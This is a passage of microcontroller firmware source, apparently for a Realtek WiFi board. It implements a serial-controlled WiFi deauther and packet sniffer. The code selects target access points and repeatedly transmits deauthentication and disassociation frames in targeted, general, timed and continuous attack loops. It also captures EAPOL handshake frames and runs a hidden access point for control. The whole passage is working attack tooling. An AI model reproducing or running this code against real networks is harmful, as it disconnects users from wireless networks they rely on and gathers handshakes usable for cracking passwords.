    sendResponse("[CMD] Switching to PWNAGOTCHI sniffing mode");
  }
  else if (command == "sniff all") {
    currentMode = SNIFF_ALL;
    startSniffing();
    sendResponse("[CMD] Switching to ALL sniffing mode");
  }
  else if (command == "stop sniff") {
    stopSniffing();
  }
  //==========================
  // "set" Command (Existing)
  //==========================
  else if (command.startsWith("set ")) {
    String setting = command.substring(4);
    setting.trim();
    int space_index = setting.indexOf(' ');
    if (space_index != -1) {
      String key = setting.substring(0, space_index);
      String value = setting.substring(space_index + 1);
      value.replace(" ", "");

      if (key.equalsIgnoreCase("cycle_delay")) {
        cycle_delay = value.toInt();
        sendResponse("[INFO] Updated cycle_delay to " + String(cycle_delay) + " ms.");
      }
      else if (key.equalsIgnoreCase("scan_time")) {
        scan_time = value.toInt();
        sendResponse("[INFO] Updated scan_time to " + String(scan_time) + " ms.");
      }
      else if (key.equalsIgnoreCase("num_frames")) {
        num_send_frames = value.toInt();
        sendResponse("[INFO] Updated num_send_frames to " + String(num_send_frames) + ".");
      }
      else if (key.equalsIgnoreCase("start_channel")) {
        start_channel = value.toInt();
        sendResponse("[INFO] Updated start_channel to " + String(start_channel) + ".");
      }
      else if (key.equalsIgnoreCase("scan_cycles")) {
        if (value.equalsIgnoreCase("on")) {
          scan_between_cycles = true;
          sendResponse("[INFO] Scan between attack cycles activated.");
        }
        else if (value.equalsIgnoreCase("off")) {
          scan_between_cycles = false;
          sendResponse("[INFO] Scan between attack cycles deactivated.");
        }
        else {
          sendResponse("[ERROR] Invalid value for scan_cycles. Use 'on' or 'off'.");
        }
      }
      else if (key.equalsIgnoreCase("led")) {
        if (value.equalsIgnoreCase("on")) {
          USE_LED = true;
          sendResponse("[INFO] LEDs activated.");
        }
        else if (value.equalsIgnoreCase("off")) {
          USE_LED = false;
          sendResponse("[INFO] LEDs deactivated.");
        }
        else {
          sendResponse("[ERROR] Invalid value for LED. Use 'set led on' or 'set led off'.");
        }
      }
      else if (key.equalsIgnoreCase("target")) {
        // e.g., set target 1,2,3
        target_aps.clear();
        target_mode = false;

        int start = 0;
        int end   = 0;
        while ((end = value.indexOf(',', start)) != -1) {
          String index_str = value.substring(start, end);
          int target_index = index_str.toInt();
          if (target_index >= 0 && target_index < (int)scan_results.size()) {
            target_aps.push_back(scan_results[target_index]);
          }
          else {
            sendResponse("[ERROR] Invalid target index: " + index_str);
          }
          start = end + 1;
        }

        // Last index
        if (start < value.length()) {
          String index_str = value.substring(start);
          int target_index = index_str.toInt();
          if (target_index >= 0 && target_index < (int)scan_results.size()) {
            target_aps.push_back(scan_results[target_index]);
          }
          else {
            sendResponse("[ERROR] Invalid target index: " + index_str);
          }
        }

        if (!target_aps.empty()) {
          target_mode = true;
          sendResponse("[INFO] Targeting the following APs:");
          for (size_t i = 0; i < target_aps.size(); i++) {
            sendResponse("[INFO] - SSID: " + target_aps[i].ssid + " BSSID: " + target_aps[i].bssid_str);
          }
        }
        else {
          target_mode = false;
          sendResponse("[INFO] No valid targets selected.");
        }
      }
      else if (key.equalsIgnoreCase("debug")) {
        if (value.equalsIgnoreCase("true")) {
          DEBUG_MODE = true;
          sendResponse("[INFO] Debug mode enabled.");
        }
        else if (value.equalsIgnoreCase("false")) {
          DEBUG_MODE = false;
          sendResponse("[INFO] Debug mode disabled.");
        }
        else {
          sendResponse("[ERROR] Invalid value for debug. Use 'set debug true' or 'set debug false'.");
        }
      }
      else {
        sendResponse("[ERROR] Unknown setting: " + key);
      }
    }
    else {
      sendResponse("[ERROR] Invalid format. Use: set <key> <value>");
    }
  }
  else if (command.equalsIgnoreCase("info")) {
    sendResponse("[INFO] Current Configuration:");
    sendResponse("[INFO] Cycle Delay: " + String(cycle_delay) + " ms");
    sendResponse("[INFO] Scan Time: " + String(scan_time) + " ms");
    sendResponse("[INFO] Number of Frames per AP: " + String(num_send_frames));
    sendResponse("[INFO] Start Channel: " + String(start_channel));
    sendResponse("[INFO] Scan between attack cycles: " + String(scan_between_cycles ? "Enabled" : "Disabled"));
    sendResponse("[INFO] LEDs: " + String(USE_LED ? "On" : "Off"));

    if (target_mode && !target_aps.empty()) {
      sendResponse("[INFO] Targeted APs:");
      for (size_t i = 0; i < target_aps.size(); i++) {
        sendResponse("[INFO] - SSID: " + target_aps[i].ssid +
                     " BSSID: " + target_aps[i].bssid_str);
      }
    }
    else {
      sendResponse("[INFO] No APs targeted.");
    }
    sendResponse("[INFO] Current Mode: " + String(currentMode));
    if (DEBUG_MODE) {
      sendResponse("[DEBUG] 'info' command processed");
    }
  }
  else if (command.equalsIgnoreCase("help")) {
    sendResponse("[INFO] Available Commands:");
    sendResponse("[INFO]  - start deauther       : Begin the deauth attack cycle.");
    sendResponse("[INFO]  - stop deauther        : Stop all attack cycles.");
    sendResponse("[INFO]  - scan                 : Perform a WiFi scan and display results.");
    sendResponse("[INFO]  - results              : Show last scan results.");
    sendResponse("[INFO]  - disassoc             : Begin continuous disassociation attacks.");
    sendResponse("[INFO]  - random_attack        : Deauth a randomly chosen AP from the scan list.");
    sendResponse("[INFO]  - attack_time <ms>     : Start a timed attack for the specified duration.");
    sendResponse("[INFO] WiFi Sniffer Commands:");
    sendResponse("[INFO]  - start sniff          : Enable the sniffer with ALL mode.");
    sendResponse("[INFO]  - sniff beacon         : Enable/Disable beacon capture.");
    sendResponse("[INFO]  - sniff probe          : Enable/Disable probe requests/responses.");
    sendResponse("[INFO]  - sniff deauth         : Enable/Disable deauth/disassoc frames.");
    sendResponse("[INFO]  - sniff eapol          : Enable/Disable EAPOL frames.");
    sendResponse("[INFO]  - sniff pwnagotchi     : Enable/Disable Pwnagotchi beacons.");
    sendResponse("[INFO]  - sniff all            : Enable/Disable all frames.");
    sendResponse("[INFO]  - stop sniff           : Stop sniffing.");
    sendResponse("[INFO]  - hop on               : Enable channel hopping.");
    sendResponse("[INFO]  - hop off              : Disable channel hopping.");
    sendResponse("[INFO] Configuration Commands:");
    sendResponse("[INFO]  - set <key> <value>    : Update configuration values:");
    sendResponse("[INFO]      * ch X             : Set to specific channel X, or 'set ch 1,6,36' for multiple.");
    sendResponse("[INFO]      * target <indices> : Set target APs by their indices, e.g., 'set target 1,3,5'.");
    sendResponse("[INFO]      * cycle_delay (ms) : Delay between scan/deauth cycles.");
    sendResponse("[INFO]      * scan_time (ms)   : Duration of WiFi scans.");
    sendResponse("[INFO]      * num_frames       : Number of frames sent per AP.");
    sendResponse("[INFO]      * start_channel    : Start channel for scanning (1 or 36).");
    sendResponse("[INFO]      * scan_cycles      : on/off - Enable or disable scan between cycles.");
    sendResponse("[INFO]      * led on/off       : Enable or disable LEDs.");
    sendResponse("[INFO]      * debug on/off     : Enable or disable debug mode.");
    sendResponse("[INFO]      * debug true/false : Enable or disable debug mode.");
    sendResponse("[INFO]  - info                 : Display the current configuration.");
    sendResponse("[INFO]  - help                 : Display this help message.");
  }
  else if (command.equalsIgnoreCase("toggle_debug")) {
    DEBUG_MODE = !DEBUG_MODE;
    sendResponse(DEBUG_MODE ? "[INFO] Debug mode enabled." : "[INFO] Debug mode disabled.");
  }
  else if (command.equalsIgnoreCase("debug on")) {
    DEBUG_MODE = true;
    sendResponse("[INFO] Debug mode enabled.");
  }
  else if (command.equalsIgnoreCase("debug off")) {
    DEBUG_MODE = false;
    sendResponse("[INFO] Debug mode disabled.");
  }
  else {
    sendResponse("[ERROR] Unknown command. Type 'help' for a list of commands.");
  }

  if (DEBUG_MODE) {
    sendResponse("[DEBUG] Command Handling Complete.");
  }
}

//==========================================================
// Attack Functions
//==========================================================
void targetAttack() {
  if (target_mode && attack_enabled) {
    sendResponse("[INFO] Targeted attack started.");
    for (size_t i = 0; i < target_aps.size(); i++) {
      wifi_set_channel(target_aps[i].channel);
      for (int j = 0; j < num_send_frames; j++) {
        wifi_tx_deauth_frame(target_aps[i].bssid, dst_mac, 2);
        if (USE_LED) {
          digitalWrite(LED_B, HIGH);
          delay(50);
          digitalWrite(LED_B, LOW);
        }
        sendResponse("[INFO] Deauth " + String(j + 1) + " => " + target_aps[i].ssid +
                     " (" + target_aps[i].bssid_str + ") on channel " +
                     String(target_aps[i].channel));
      }
    }
    sendResponse("[INFO] Targeted attack completed.");
  }
}

void generalAttack() {
  if (!target_mode && attack_enabled) {
    sendResponse("[INFO] General attack started.");
    attackCycle();
    sendResponse("[INFO] General attack completed.");
  }
}

void attackCycle() {
  sendResponse("[INFO] Starting attack cycle...");

  uint8_t currentChannel = 0xFF;
  for (size_t i = 0; i < scan_results.size(); i++) {
    uint8_t targetChannel = scan_results[i].channel;
    if (targetChannel != currentChannel) {
      wifi_set_channel(targetChannel);
      currentChannel = targetChannel;
    }

    for (int j = 0; j < num_send_frames; j++) {
      wifi_tx_deauth_frame(scan_results[i].bssid, dst_mac, 2);
      if (USE_LED) {
        digitalWrite(LED_B, HIGH);
        delay(50);
        digitalWrite(LED_B, LOW);
      }
      sendResponse("[INFO] Deauth " + String(j + 1) + " => " + scan_results[i].ssid +
                   " (" + scan_results[i].bssid_str + ") on channel " +
                   String(scan_results[i].channel));
    }
  }
  sendResponse("[INFO] Attack cycle completed.");
}

//==========================================================
// Setup
//==========================================================
void setup() {
  Serial.begin(115200);
  // Initialize UART
  Serial1.begin(115200);

  sendResponse("[INFO] USB Serial Test: Setup initialized.");
  sendResponse("[INFO] UART Serial Test: Setup initialized.");

  if(USE_LED) {
    pinMode(LED_R, OUTPUT);
    pinMode(LED_G, OUTPUT);
    pinMode(LED_B, OUTPUT);

    // Simple LED test sequence
    digitalWrite(LED_R, HIGH); delay(200); digitalWrite(LED_R, LOW);
    digitalWrite(LED_G, HIGH); delay(200); digitalWrite(LED_G, LOW);
    digitalWrite(LED_B, HIGH); delay(200); digitalWrite(LED_B, LOW);
    digitalWrite(LED_R, HIGH); digitalWrite(LED_G, HIGH);
    delay(200);
    digitalWrite(LED_R, LOW); digitalWrite(LED_G, LOW);
    digitalWrite(LED_G, HIGH); digitalWrite(LED_B, HIGH);
    delay(200);
    digitalWrite(LED_G, LOW); digitalWrite(LED_B, LOW);
    digitalWrite(LED_R, HIGH); digitalWrite(LED_B, HIGH);
    delay(200);
    digitalWrite(LED_R, LOW); digitalWrite(LED_B, LOW);
    digitalWrite(LED_R, HIGH); digitalWrite(LED_G, HIGH); digitalWrite(LED_B, HIGH);
    delay(200);
    digitalWrite(LED_R, LOW); digitalWrite(LED_G, LOW); digitalWrite(LED_B, LOW);
  }

  sendResponse("[INFO] Initializing WiFi in hidden AP mode...");
  wifi_on(RTW_MODE_AP);
  wifi_start_ap_with_hidden_ssid(WIFI_SSID,
                                 RTW_SECURITY_WPA2_AES_PSK,
                                 WIFI_PASS,
                                 11,   // keyID
                                 18,   // SSID length
                                 WIFI_CHANNEL);
  sendResponse("[INFO] Hidden AP started. Selected channel: " + String(WIFI_CHANNEL));

  last_cycle = millis();
}

//==========================================================
// Main Loop
//==========================================================
void loop() {
  // Handle commands from UART Serial
  if (Serial1.available()) {
    String command = Serial1.readStringUntil('\n');
    command.trim();
    if (command.length() > 0) {
      handleCommand(command);
    }
  }

  // Handle commands from USB Serial
  if (Serial.available()) {
    String command = Serial.readStringUntil('\n');
    command.trim();
    if (command.length() > 0) {
      sendResponse("[INFO] USB Command Received: " + command);
      handleCommand(command);
    }
  }

  // Timed Attack check
  checkTimedAttack();

  // Attack cycles
  if(millis() - last_cycle > cycle_delay) {
    if(attack_enabled) {
      // Optionally perform a scan between cycles
      if(scan_between_cycles) {
        sendResponse("[INFO] Starting scan between attack cycles...");
        if(scanNetworks() == 0) {
          printScanResults();
        }
        else {
          sendResponse("[ERROR] Scan failed.");
        }
      }
      if(target_mode) {
        targetAttack();
      }
      else {
        generalAttack();
      }
    }
    last_cycle = millis();
  }

  //===============================
  // CONTINUOUS DISASSOC ATTACK
  //===============================
  if(disassoc_enabled && (millis() - last_disassoc_attack >= disassoc_interval)) {
    last_disassoc_attack = millis();

    // Decide which list of APs to attack
    const std::vector<WiFiScanResult> &aps_to_attack =
        (target_mode && !target_aps.empty()) ? target_aps : scan_results;

    if(aps_to_attack.empty()) {
      sendResponse("[INFO] No APs available for Disassociation Attack. Perform a scan or set targets first.");
      return;
    }

    for(size_t i = 0; i < aps_to_attack.size(); i++) {
      wifi_set_channel(aps_to_attack[i].channel);

      for(int j = 0; j < num_send_frames; j++) {
        // Reason code 8 => Disassociated because station left
        wifi_tx_disassoc_frame(aps_to_attack[i].bssid, dst_mac, 0x08); 

        // Optional LED blink
        if(USE_LED) {
          digitalWrite(LED_B, HIGH);
          delay(50);
          digitalWrite(LED_B, LOW);
        }

        sendResponse("[INFO] Disassoc frame " + String(j + 1) + " => " + aps_to_attack[i].ssid +
                     " (" + aps_to_attack[i].bssid_str + ") on channel " +
                     String(aps_to_attack[i].channel));
      }
    }

    sendResponse("[INFO] Disassociation Attack cycle completed.");
  }

  // Handle channel hopping if enabled
  if (isSniffing) {
    hopChannel();
  }
}

void uart_event_task(void *pvParameters) {
    (void)pvParameters; // Suppress unused parameter warning
    uint8_t* dtmp = (uint8_t*) malloc(UART_BUFFER_SIZE);
    
    if (!dtmp) {
        sendResponse("[ERROR] Failed to allocate UART buffer");
        return;
    }

    for(;;) {
        if (Serial1.available()) {
            int length = Serial1.readBytes(dtmp, UART_BUFFER_SIZE);
            if (length > 0) {
                dtmp[length] = '\0';
                sendResponse("[DEBUG] Received " + String(length) + " bytes: " + String((char*)dtmp));
                // Process the received data

                // Chunk data transmission
                for (int i = 0; i < length; i += UART_CHUNK_SIZE) {
                    int chunkSize = (i + UART_CHUNK_SIZE > length) ? length - i : UART_CHUNK_SIZE;
                    sendResponse("[DEBUG] Sending chunk of " + String(chunkSize) + " bytes");
                    Serial1.write(dtmp + i, chunkSize);
                    delay(50); // Small delay between chunks
                }
            }
        }
        delay(10); // Yield to other tasks
    }

    free(dtmp);
}
